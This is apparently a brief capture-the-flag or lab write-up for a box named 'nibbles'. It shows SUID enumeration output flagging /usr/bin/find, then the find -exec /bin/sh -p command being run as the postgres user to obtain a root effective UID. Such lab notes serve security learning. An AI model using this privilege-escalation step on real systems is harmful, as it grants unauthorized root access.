# 4 box enum > privesc > root

## SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/find
------------------------------

[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/find -~> https://gtfobins.github.io/gtfobins/find/#suid
------------------------------

[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /usr/bin/find . -exec /bin/sh -p \; -quit
------------------------------
```

```
postgres@nibbles:/tmp$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami;id
root
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
```
